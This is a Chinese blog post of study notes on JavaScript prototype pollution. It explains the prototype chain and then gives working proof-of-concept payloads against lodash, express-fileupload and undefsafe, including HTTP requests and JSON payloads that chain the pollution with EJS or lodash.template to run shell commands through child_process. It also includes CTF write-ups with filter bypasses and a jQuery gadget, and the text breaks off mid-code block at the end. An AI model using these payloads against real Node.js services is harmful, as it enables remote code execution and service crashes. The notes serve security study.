---
title: "js原型污染学习笔记"
slug: "js-prototype-pollution-study-notes"
description: "很早之前的了，同步到博客上一份，无参考价值 仅个人学习记录用"
date: 2022-05-04T17:10:23+08:00
categories: ["NOTES&SUMMARY"]
series: ["前端安全"]
tags: ["js"]
draft: false
toc: true
---

学的时候随手记录的，可能有很多错误，见谅（

参考链接统一在文末

----

##  基本定义

### `prototype`&`__proto__`

js中定义类需要通过定义构造函数的方式进行

```js
function Foo() {
    this.bar = 1
}

new Foo()
```

`Foo`函数的内容就是`Foo`类的构造函数，而`this.bar`是`Foo`类的一个属性；除了定义了值的普通属性我们还可以将方法定义到构造函数内部

```js
function Foo() {
    this.bar = 1
    this.show = function(){
        console.log(this.bar)
    }
}

(new Foo()).show()
```

可是这样的写法会造成一个问题，即每当我们新建一个`Foo`对象时，`this.show = function()`这样的代码就会执行一次，`show`方法被绑定在对象上而不是类中；我们希望创建类时只创建一次`show`方法，这时候需要使用原型`prototype`

```js
function Foo() {
    this.bar = 1
}

Foo.prototype.show = function show() {
    console.log(this.bar)
}

let foo = new Foo()
foo.show()
```

`prototype`是类`Foo`的一个属性，而所有用`Foo`类实例化的对象都将拥有这个属性中的全部内容（包括变量和方法），比如上述代码中的`foo`对象可以直接调用`show`方法/函数

我们是通过`Foo.prototype`来访问`Foo`类的原型，但经过`Foo`实例化的对象是不能通过`.prototype`来访问原型的，而是借助`__proto__`

![image-20211216103317818](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216103317818.png)

经由类实例化而来的对象可以通过`.__proto__`来访问对应类的原型，即

```js
foo.__proto__ == Foo.prototype
```

所以总结两点

- 类自带`prototype`属性，经由类实例化来的对象会自动带上`prototype`中的属性和方法
- 经由类实例化而来的对象可以通过`.__proto__`来访问对应类的原型
- 经由类实例化而来的对象可以通过`.constructor`来获取构造这个实例的本来的函数

### `constructor`

```js
function Dog(name) {
  this.name = name
}

Dog.prototype.sayHi = function() {
  console.log('I am', this.name)
}

let d = new Dog('yo')
d.sayHi() // I am yo

console.log(d.constructor) // [Function: Dog]
```

最后一行，`d.constructor`可以返回构造这个实例的本来的函数

```js
function test(){}

console.log(test.constructor)	// [Function: Function]
console.log(test.constructor === Function.constructor)	// true
```

任意一个函数的contructor，都将会返回`Function.constructor`，而它可以用来构造函数

利用这一点，我们可以用任意内建函数来构造新的函数了

```js
var f1 = [].map.constructor('console.log(123)')
var f2 = Math.min.constructor('console.log(456)')
f1()	// 123
f2()	// 456
```

甚至........也不是不可以嘛

```js
var f3 = (1).constructor.constructor('console.log("abc")')()
f3()	// abc
```

同理，`[]`，`''`，`{}`都是可以的，单独的`()`不行 得有数字

### 原型链&继承

这么好的两个特性被用来实现js的继承机制，举个例子

```js
function Father(){
    this.firstName = 'Lao'
    this.lastName = 'Wang'
}
function Son(){
    this.firstName = 'Ming'
}
Son.prototype = new Father()

let son = new Son()
console.log(`Name: ${son.firstName} ${son.lastName}`)
// Name: Ming Wang
```

`son.lastName`被调用后查找`lastName`有一个顺序

- 对象`son`
- `son.__proto__`
- `son.__proto__.__proto__`
- `son.__proto__.__proto__.__proto__`
- `son.__proto__.__proto__.__proto__.__proto__` -> NULL 结束

![image-20211216104636009](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216104636009.png)

就是js这个在面向对象的继承中使用的查找机制，被称作原型继承链

————注意在这个查找的过程中并没有出现`prototype`，而是通过`xyz.__proto__`来暴露`prototype`，真正参与查找的 是对象的`__proto__`

![image-20211216132321698](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216132321698.png)

![img](https://p5.ssl.qhimg.com/t011cffd77e8d3ec6c6.png)

另外，对于继承的表达方式除了`.`还有`[]`，后者一般在属性名是动态时使用，两种表达方式是一样的

### 原型链污染

既然`foo.__proto__ == Foo.prototype`，那修改前者是否能直接影响类呢？

首先需要注意的：

> *What's good to note about this property is that it's implemented as a getter/setter property which invokes getPrototypeOf/setPrototypeOf on read/write. So assigning a new value to the property "\__proto__" doesn't shadow the inherited value defined on the prototype. The only way to shadow it invovles using "Object.defineProperty".*

![image-20211216141504236](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216141504236.png)

要注意，只是这样的修改并不足以污染原型链，只是修改当前运行状态下这个对象的属性而已，还要再向上找一级`__proto__`

![image-20211216143104719](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216143104719.png)

一个正常的栗子

![image-20211216105206819](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216105206819.png)

我们通过`foo.__proto__.bar`修改的是`foo`的原型，当修改之后调用`foo.bar`由于查找顺序的原因并没有立即修改值，而继承自`{}`的`zoo`对象，其`bar`属性已经被污染了

综上，如果我们可以控制并修改一个对象的原型，就可以影响所有和这个对象来自同一类、父祖类的对象，这就是**原型链污染**

## 应用场景

常用的两种修改方式

- `obj[a][b] = value`: `obj[__proto__][modify_property] = value`
- `obj[a][b][c] = value`: `obj[constructor][prototype][modify_property] = value`

在什么情况下我们可以设置`__proto__`的值呢？我们找能控制数组（对象）的键名的操作即可

- Object recursive merge
- Object clone
- Property defination by path



### 对象`merge`操作

```js
function merge(target, source){
    for(let key in source){
        if(key in source && key in target){
            merge(target[key], source[key])	// !
        }else{
            target[key] = source[key]
        }
    }
}
```

在第四行的赋值过程中，如果`key == '__proto__'`是否会造成原型链污染呢？

```js
let o1 = {}
let o2 = {a: 1, "__proto__": {b: 2}}
merge(o1, o2)
console.log(o1.a, o1.b)

o3 = {}
console.log(o3.b)
```

![image-20211216112209243](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216112209243.png)

虽然merge成功了，但是原型链被没有受到污染

原因是因为我们在`let o2 = {a: 1, "__proto__": {b: 2}}`创建o2时，实际的两个键名是`a, b`而不是`a, __proto__`，`__proto__`就不是一个key，自然也不会修改Object的原型（看起来很奇怪，但是就是这样

![image-20220414112407556](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220414112407556.png)

让它被认做一个键名需要修改一下创建o2的方式`let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')`

![image-20211216112520073](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216112520073.png)

在JSON解析的情况下`__proto__`被认作是键名而不是原型，所以成功了

### 由传入参数定义对象属性

```js
function theFunc(object, path, value){
	object.path = value
}
```

如果`path`和`value`的值可以被我们指定，我们可以设定`path = "__proto__.myValue"`，之后指定`value`的值

具体操作可见后面的CVE-2019-10795(undefsafe)，lodash.set

### 对象`clone`操作

> *Prototype pollution can happen with API that clone object when the API implements the clone as recursive merge on an empty object. Do note that merge function must be affected by the issue.*

```js
function clone(obj){
	return merge({}, obj)
}
```

## 攻击实现

奈何不是很好归类，如果按攻击方式归类的话会出现重复的模块和不好分类的地方，呜呜呜呜呜呜，好乱

### 对象`merge`操作

#### lodash.mergeWith

类似lodash.merge，多接收一个参数customizer

```js
mergeWith(object, sources, [customizer]);
```

如果是undefined就跟merge一样了

```js
var lodash= require('lodash');
var payload = '{"__proto__":{"whoami":"Vulnerable"}}';

var a = {};
console.log("Before whoami: " + a.whoami);
lodash.mergeWith({}, JSON.parse(payload));
console.log("After whoami: " + a.whoami);
```

### 由传入参数定义对象属性

#### lodash.set

```js
set(object, path, value);
```

设置值到对象对应的属性路径上

```js
var lodash= require('lodash');

var object_1 = { 'a': [{ 'b': { 'c': 3 } }] };
var object_2 = {}

console.log(object_1.whoami);
// undefined
lodash.set(object_2, '__proto__.["whoami"]', 'Vulnerable');
console.log(object_1.whoami);
// Vulnerable
```

#### lodash.setWith

```js
setWith(object, path, value, [customizer])
```

POC

```js
var lodash= require('lodash');

var object_1 = { 'a': [{ 'b': { 'c': 3 } }] };
var object_2 = {}

console.log(object_1.whoami);
// undefined
lodash.setWith(object_2, '__proto__.["whoami"]', 'Vulnerable');
console.log(object_1.whoami);
// Vulnerable
```

#### lodash.defaultsDeep/CVE-2019-10744

```js
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"constructor": {"prototype": {"a0": true}}}'

function check() {
    mergeFn({}, JSON.parse(payload));
    if (({})[`a0`] === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
  }

check();
```







### 污染`toString`&`valueOf`方法造成500

#### express-fileupload - CVE-2020-7699

- 版本要求：express-fileupload < 1.1.8; `parseNested = true`

express-fileupload模块可为express应用提供文件上传功能，该漏洞可引发DOS，配合EJS等模板引擎可以达到rce

```bash
npm i express-fileupload@1.1.7-alpha.4
```

定位到关键代码

![image-20211216160955128](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216160955128.png)

![image-20211216161010706](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216161010706.png)

当`parseNested`为ture，就会实现`processNested`方法，与上文提到的`merge`方法很类似，但是他会对传入的字典进行一个离谱的分析，当我们传入

```
{"a.b.c": "whoami"}
```

返回的是

```
{ a: { b: { c: 'whoami' } } }
```

![image-20211216162149919](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216162149919.png)

那我们要是传入

```
{"__proto__.toString":"whoami"}
```

![image-20211216162722845](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216162722845.png)

可以看到我们雀食把Object对象的`toString`方法给污染为了whoami

一个完整的栗子

```js
const express = require('express')
const fileupload = require('express-fileupload')
const app = express()

app.use(fileupload({parseNested: true}))
app.get('/', (req, res)=>{
    res.end('express-fileupload poc')
})

var server = app.listen(3000, function (){
    var host = server.address().address
    var port = server.address().port
    console.log('url: http://%s:%s/', host, port)
})
```

poc

```http
POST / HTTP/1.1
Host: 192.168.18.1:3000
Content-Type: multipart/form-data; boundary=--------1566035451
Content-Length: 134

----------1566035451
Content-Disposition: form-data; name="__proto__.toString"; filename="filename"

whoami
----------1566035451--

```

![image-20211216163633664](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216163633664.png)

之后再次刷新我们的http页面

![image-20211216163655473](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216163655473.png)

已经成功崩坏了

#### undefsafe - CVE-2019-10795

- 版本要求：Undefsafe < 2.0.3

这个模块的核心是一个用来处理访问对象属性不存在时的报错相关逻辑的函数

```bash
npm i undefsafe@2.0.2
```

先简单测试模块使用，首先是用undefined解决烦人的长调用栈报错

```js
var undefsafe = require('undefsafe')
var object = {
    a:{
        b:{
            c:1,
            d:[1,2,3],
            e:'amiz'
        }
    }
}
console.log(object.a.b.e)
// amiz
console.log(a(object, 'a.b.e'))
// amiz
console.log(object.a.c.e)
// TypeError: Cannot read property 'e' of undefined
// .....
console.log(undefsafe(object, 'a.c.e'))
// undefined
```

然后是简易赋值

```js
console.log(object)
//{ a: { b: { c: 1, d: [Array], e: 'amiz' } } }
undefsafe(object, 'a.b.e', '123')
console.log(object)
// { a: { b: { c: 1, d: [Array], e: '123' } } }
```

但如果我们访问的属性不存在

```js
console.log(object)
//{ a: { b: { c: 1, d: [Array], e: 'amiz' } } }
undefsafe(object, 'a.f.e', '123')
console.log(object)
// { a: { b: { c: 1, d: [Array], e: 'amiz' }, e: '123' } }
```

它会直接给你摞起来，看起来肥肠的奇怪

demo1.js

```js
var undefsafe = require('undefsafe')
var object = {
    a:{
        b:{
            c:1,
            d:[1,2,3],
            e:'amiz'
        }
    }
}

var payload = "__proto__.toString"
undefsafe(object, payload, "whoami")
console.log(object.toString)
// whoami
```

当传入的后两个参数可控时可以污染`object`对象

demo2.js

```js
test = {}
console.log('this is ' + test)
// this is [object Object]
undefsafe(test, '__proto__.toString', function (){return 'evil code'})
console.log('this is ' + test)
// this is evil code
```

将对象和字符串拼接时自动调用`toString`，但是test对象中没有，于是到`test.__proto__`中寻找，找到了`toString`并调用，而此时`toString`已经被污染

### 结合模板引擎RCE的实例

####  express-fileupload - CVE-2020-7699

- 版本要求：express-fileupload < 1.1.8; `parseNested = true`

同样是这个版本的express-fileupload，还可以结合ejs模板实现RCE

server.js

```js
const express = require('express')
const fileupload = require('express-fileupload')
const app = express()

app.use(fileupload({parseNested: true}))
app.get('/', (req, res)=>{
    console.log(Object.prototype.polluted)
    res.render('index.ejs')
})

var server = app.listen(3000, function (){
    var host = server.address().address
    var port = server.address().port
    console.log('url: http://%s:%s/', host, port)
})
```

index.ejs

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
</head>
<body>

<h1><%= message%></h1>

</body>
</html>
```

poc

```http
POST / HTTP/1.1
Host: 192.168.18.1:3000
Content-Type: multipart/form-data; boundary=--------1566035451
Content-Length: 202

----------1566035451
Content-Disposition: form-data; name="__proto__.outputFunctionName";

_tmp1;global.process.mainModule.require('child_process').execSync('calc');var __tmp2
----------1566035451--

```

与上面相同，发送poc后刷新页面即可弹计算器

![image-20211216164651808](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216164651808.png)

#### lodash.merge

- 版本要求：lodash < 4.17.11; 4.17.4之后过滤关键词`__proto__`，可用`Object.constructor.prototype`进行绕过

server.js

```js
var express = require('express');
var lodash = require('lodash');
var ejs = require('ejs');

var app = express();
//设置模板的位置与种类
app.set('views', __dirname);
app.set('views engine','ejs');

//对原型进行污染 __proto__.xxx
var malicious_payload = '{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec(\'calc\');var __tmp2"}}';

// 4.17.4之后版本进行`__proto__`过滤 使用Object.constructor.prototype绕过
// var malicious_payload = '{"Object":{"constructor":{"prototype":{"outputFunctionName": "_tmp1;global.process.mainModule.constructor._load(\'child_process\').execSync(\'calc\');var __tmp2"}}}}'

lodash.merge({}, JSON.parse(malicious_payload));

//进行渲染
app.get('/', function (req, res) {
    res.render ("index.ejs",{
        message: 'whoami test'
    });
});

var server = app.listen(8000, function () {

    var host = server.address().address
    var port = server.address().port

    console.log("应用实例，访问地址为 http://%s:%s", host, port)
});
```

![image-20211216193535948](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216193535948.png)

在第12行下断点

![image-20211216194516601](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216194516601.png)

可以看到在它执行结束之后Object的原型链上多了一个`outputFunctionName`，我们先跟进调用看看后面接入ejs的部分是怎么执行的；在16行打断点，刷新后看render方法

![image-20211216202304738](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202304738.png)

跟入app.render()，express\lib\application.js

![image-20211216202413998](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202413998.png)

![image-20211216202548944](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202548944.png)

跟进view.render()，express\lib\view.js

![image-20211216205348481](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216205348481.png)

可见我们的恶意代码部分被以options参数的形式加载到了this.engine中，之后engine选用ejs模板引擎，进入ejs\lib\ejs.js

进入renderFile函数，返回tryHandleCache()，跟入

![image-20211216204703770](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204703770.png)

![image-20211216204731800](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204731800.png)

跟入compile，这里有大量的字符串拼接，我们的恶意代码就这样被拼进去了

![image-20211216204911158](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204911158.png)

这里的`opts.outputFunctionName`正是我们污染的`opts.__proto__outputFunctionName`，也就是一开始进入render的opts

倒叙了属于是，看一下这个lodash.merge的整个过程

![image-20211223141129212](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223141129212.png)

注意到这里的函数和注释，就很有原型污染的可能啊

![image-20211216213329296](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216213329296.png)

当我们的payload从这里传入的时候，在进入`baseMergeDeep`之后会先有一个`safeGet`的过滤

![image-20211223142008142](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142008142.png)

![image-20211223141632227](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223141632227.png)

但是我们用`prototype`就轻松绕过了，之后`srcvalue`被赋给`newValue`，进入`assignMergeValue`，调用一次`baseAssginValue`

![image-20211223142953795](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142953795.png)

![image-20211223142803073](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142803073.png)

![image-20211223143141313](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223143141313.png)

彻底将`prototype`的值赋给我们的payload，做到原型污染

#### lodash.template

直接拿p牛的题举例了，这个洞是最近不久才被修复，不过虽然这里利用的同样是`lodash.merge`，不过却和上面的`lodash.merge`不是一条调用链，所以受影响版本不同

##### [Codebreaking 2018]Thejs

```js
const fs = require('fs')
const express = require('express')
const bodyParser = require('body-parser')
const lodash = require('lodash')
const session = require('express-session')
const randomize = require('randomatic')

const app = express()
app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
app.use('/static', express.static('static'))
app.use(session({
    name: 'thejs.session',
    secret: randomize('aA0', 16),
    resave: false,
    saveUninitialized: false
}))
app.engine('ejs', function (filePath, options, callback) { // define the template engine
    fs.readFile(filePath, (err, content) => {
        if (err) return callback(new Error(err))
        let compiled = lodash.template(content)	// 继承自lodash
        let rendered = compiled({...options})

        return callback(null, rendered)
    })
})
app.set('views', './views')
app.set('view engine', 'ejs')

app.all('/', (req, res) => {
    let data = req.session.data || {language: [], category: []}
    if (req.method == 'POST') {
        data = lodash.merge(data, req.body)	// 可以原型链污染lodash
        req.session.data = data
    }

    res.render('index', {
        language: data.language,
        category: data.category
    })
})

app.listen(3000, () => console.log(`Example app listening on port 3000!`))
```

我们可以通过污染`loadsh.merge`给`Object`对象插入任意属性，最后污染`loadsh.template`；具体污染`lodash.template`的哪个属性，还要参考源码

```
// https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165
// Use a sourceURL for easier debugging.
var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
// ...
var result = attempt(function() {
  return Function(importsKeys, sourceURL + 'return ' + source)
  .apply(undefined, importsValues);
});
```

`options.sourceURL`没有赋值，取空字符串，我们给所有`Object`对象插入一个`sourceURL`属性，就会被拼入`return Function`的第二个参数中造成rce

payload

```json
{"__proto__":{"sourceURL":"\u000areturn e=>{for(var a in {}){delete Object.prototype[a];}return global.process.mainModule.consturctor._load('child_process').execSync('ls /').toString()}\u000a//"}}
```

### 借助其它库扩大攻击面

#### express-validator + lodash

- lodash<4.17.17

来源于一道CTF题（而且被抄了2次还），在本身lodash存在原型污染的情况下结合其它库扩大攻击面

##### [XNUCACTF 2020 Qualifier]oooooooldjs

这个题有三个考点，还是肥肠的难顶的

- 原型链污染：lodash.set + express-validator
- 异步bug
- jQuery RCE gadget

###### express-validator的具体实现

我们以一段代码作为示例

```js
const express = require('express')
const app = express()
const port = 1337

app.use(express.json())
app.use(express.urlencoded({
    extended: true
}))

const {
    body,
    validationResult
} = require('express-validator')

middlewares = [
    body('*').trim()
]

app.use(middlewares)
app.post("/user", (req, res)=>{
    const foo = "helloworld"
    return res.status(200).send(foo)
})

app.listen(port,()=>{
    console.log(`server listening on ${port}`)
})

```

其中第16行的`body('*').trim()`是对validator这一中间件的设置，可以在`node_modules\express-validator\src\middlewares\validation-chain-builders.js`中找到它的具体实现

首先是对body, cookie, header, param, query这几个对象都是对`buildCheckFunction(['xxxx'])`的封装，用来实现validator的功能

![image-20211223211308807](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223211308807.png)

如果我们在第6行下断点 可以看到对应的参数在依次传入并返回，它其实是调用了`node_modules\express-validator\src\middlewares\check.js`中`check`的实现

![image-20211223213051362](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223213051362.png)

先看返回值，`Object.assign()`函数，首先是`utils_1.bindall()`函数将传入对象的函数作为对象的一个属性进行绑定

![image-20211223213347228](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223213347228.png)

之后再传入`Object.assign`，将`sanitizers`和`validators`浅拷贝到`middleware`上，就可以通过这个`middleware`调用所有的验证和过滤函数

之后进入`express-validator\src\chain\context-runner-impl.js`看到`trim()`，跟入调用

![image-20211223222949602](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223222949602.png)

![image-20211223223012489](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223223012489.png)

`express-validator\src\context-builder.js`

![image-20211223223052594](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223223052594.png)

芜，竟然是一个入栈操作，把传入的值压入栈中

回过头去看`this.builder.addItem`，传入的是以`trim`为参数的`Sanitization`对象，为`builder`增加一个`sanitization`后返回`this.chain`即`middleware`，做到链式调用

跟入这个`Sanitization`

![image-20211223231735649](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223231735649.png)

`run`方法中调用`context.setData`来调用传入的`sanitizer`修改新的值

再往前，回到`node_modules\express-validator\src\middlewares\check.js`，刚才我们只看了返回值，但它会先在第12行new一个`ContextRunnerImpl`

`node_modules\express-validator\src\chain\context-runner-impl.js`

![image-20211223232603577](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223232603577.png)

它的`run`方法在之前的第15行被调用，可以看作是`middleware`调用的入口，这个`run`先申请了一个`context`（可以理解为http请求的上下文的一个封装），27行有一个for遍历，对于栈中的item（这个栈就是之前`addItem`的栈）再依次调用它的`run`方法

究极套娃，总结整个逻辑就是这样的：

首先将`validator`和`sanitizers`的方法绑定到`check`函数返回的`middleware`上，这些`validator`和`sanitizer`的方法是通过向`context.stack`中push `context-items`，最后在`ContextRunnerImpl.run`方法里遍历栈中的items，逐一调用其`run`方法实现`validation`或`sanitization`

###### 结合lodash.set扩大攻击面

在上面分析的最后部分我们提到了实际调用时的for循环

![image-20211223232603577](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223232603577.png)

45行有个if，如果满足`options.dryRun`为空且`reqValue!==instance.value`，就可以调用`_.set`来重置`req[location]`中的值为`newValue`；而第一个默认是undefined不用管，而第二个，以`trim`为例，如果传入的参数两边存在空白字符，经过`trim`处理后就可以满足这个条件了

这个`_.set`正是我们的老朋友`lodash.set`，尝试lodash.set的payload

```json
{"__proto__.[whoami]": "amiz "}
```

虽然满足了条件但并不能污染成功，在关键处打断点，定位到`node_modules\express-validator\src\select-fields.js`（因为在`ContextRunnerImpl.js`中的24行，在调用各种具体的`run`方法之前先调用了`this.selectFields`

![image-20211224001541686](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224001541686.png)

35行是一个`*`的通配符，`{"a":{"b":"123"}}`这样的body参数就会对b进行验证，但是如果是`{"a.b":"123"}`这样的，会将`a.b`视作一个key，不会对`a.b`进行验证，在传入`express`时不会自动进行`unfaltten`而变为一个a对象包含一个b对象；但`express-validator`内部是通过lodash的`_get`和`_set`对对象进行赋值和取值，当传入`a.b`时lodash会自动进行一个套娃（具体的前面已经写了），为了防止这种情况的出现，`express-validator`对key进行检查，可以看到57行，出现`.`就会在周围加一对方括号，起到转义作用

所以我们传入的就会变成这样

![image-20211224112317775](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224112317775.png)

![image-20211224112910994](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224112910994.png)

在两端多了方括号，破坏了我们原来的payload，相当于

```js
var _ = require('lodash')
var a = {"__proto__.[whoami]": "amiz"}
_.set(a,"[\"__proto__.[whoami]\"]", 2)	// 多了方括号
```

我们要利用`select-fileds`的一些转义的技巧来bypass

```js
{"\"].__proto__[\"whoami":"Vulnerable"}
```

相当于

```js
var _ = require('lodash')
var c = {"\"].__proto__[\"whoami": "Vulnerable"}
_.set(c,"[\"\"].__proto__[\"whoami\"]", 2)
```

构造payload的时候还要注意`lodash.set`，如果第二个参数path的值等于第一个参数object的键Key时会污染失败

![image-20211224004615093](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224004615093.png)

可以污染原型顺利增加一个参数，但是它的参数却是一个空的字符串，原因是`_set`时的第三个参数`newValue`时利用变化后的key重新从`req[location]`中取出来的，原本应该`undefined`，但是我们经过`Sanitization`的run方法时有一个`toString`

![image-20211224003615973](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224003615973.png)

所以`undefined`变为了空字符串`''`

![image-20211224003735423](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224003735423.png)

经过了这一系列的处理，`reqValue`为空就会经过`_.get`重新取值，而这里得到的`undefined`不会被`toString`处理，在46行处`undefined!==''`依旧为真，继续`_.set`，进行原型链的污染

虽然只能有限的进行污染一个空字符串，但是由于js的一些特性 比如在判断中`''`返回false，我们可以把原本的地方的判断条件结果进行一些反转，从而绕过某些限制或改变代码走向（跟hitcon的那个翻转bit的思想有点像了

###### jQuery的久远rce - CVE-2015-9251

当`jQuery`的url返回头的`content-type`字段为`text/javascript`时，即使没有设置`dataType: 'script'`也会自动`eval`返回内容

这个漏洞做到了XSS->RCE的效果，不过很早就修复了（jQuery 3.0.0），找到[修复的代码](https://github.dev/jquery/jquery/blob/5c2d08704e289dd2745bcb0557b35a9c0e6af4a4/src/ajax/script.js#L23)看能否绕过

![image-20211224140957720](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224140957720.png)

通过`s.crossDomain`来作为if判断的条件，如果为真则不会执行内容

而这个`s.CrossDomain`在默认设置中不存在；不过在jQuery初始化时用到了`jQuery.ajaxExtend`这个函数，内部通过for遍历src的key [链接在这里](https://github.dev/jquery/jquery/blob/5c2d08704e289dd2745bcb0557b35a9c0e6af4a4/src/ajax/ajax.js#L115)

![image-20211224152619790](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224152619790.png)

会去找对象上不存在但原型链上存在的key，如果此时原型链被污染就会连带到target，示例

```js
Object.prototype.polluted = ''
let a = {}
let c = {}
for( key in c){
    a[key] = c[key]
}

console.log(Object.keys(a))
// [ 'polluted' ]
console.log(a)
// { polluted: '' }
```

经过污染之后`s.crossDomain=''`变为空字符串，在经过下面这个判断

![image-20211224153115106](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211224153115106.png)

在默认中的`s.crossDomain`是undefined，而`undefined==null`为true，所以在正常情况下可以进入这个判断，不过前面我们污染它为`''`，于是这里保留空字符串不进入判断，并且上面的`if(s.crossDomain)`也不会通过判断，导致`s.content.script=true`，就可以rce了

###### ***异步编程的陷阱

这块其实不是特别懂

![image-20201022104530048](https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022104530048.png)

直接拿wp里的图了）这里的`requests`是一个异步函数，在删除`this.types`数组对应的项之后，由于异步函数的特性，`express`不会等待`requests`而是继续执行下面的代码，所以`this.datas`中对应项的删除也会被对应的异步延后，这样一来在某一时刻会存在这样的情况

![image-20201022121557273](https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022121557273.png)

我们可以利用异步函数导致的数据不一致发送一些恶意请求，构造`this.types`和`this.datas`中间一端像这个样子

![image-20201022151504944](https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022151504944.png)

然后让题目访问我们自己的url；由于后端request请求的是本地环回速度很快，所以为了在`dataRepo.D`中request没结束时构造好我们想要的数据形式，需要`dataRepo.D`中requests耗时比我们构造的时间久，比如先post一些链表形式串起来的数据，比如

![image-20201022131845955](https://github.com/NeSE-Team/XNUCA2020Qualifier/raw/main/Web/oooooooldjs/assets/image-20201022131845955.png)

然后再发起链表头数据的DELETE请求，让requests进行递归的删除，这样就可以通过这个链表的长度从而控制requests花费的时间，让requests耗费的时间符合我们的预期；链表的实际长度需要根据不同的网络状况进行调整

###### 跨域问题

设置请求头时除了有`text/javascript`以外还要另外设置允许跨域访问的请求头

```js
res.setHeader("Content-Type", "text/javascript")
res.setHeader("Access-Control-Allow-Origin", "*")
res.setHeader("Access-Control-Allow-Headers", "X-Requested-With, crossDomain")
```

[详细的exp&docker见官方仓库](https://github.com/NeSE-Team/XNUCA2020Qualifier/tree/main/Web/oooooooldjs)

###### 关于任意原型链污染

由于出题人加了个json的中间件允许传入object，导致可以做到任意污染（这下格局打开了）

```json
{"block": {"__proto__": {"a": 123}}, "block\"].__proto__[\"a": 123}
```

##### [安洵杯 2020]Validator

https://xz.aliyun.com/t/8581#toc-2

```js
if (req.body.password == "D0g3_Yes!!!"){
        console.log(info.system_open)
        if (info.system_open == "yes"){
            const flag = readFile("/flag")
            return res.status(200).send(flag)
        }else{
            return res.status(400).send("The login is successful, but the system is under test and not open...")
        }
    }else{
        return res.status(400).send("Login Fail, Password Wrong!")
    }
```

利用上面任意原型链污染的点来使`info.system_open`为真

```json
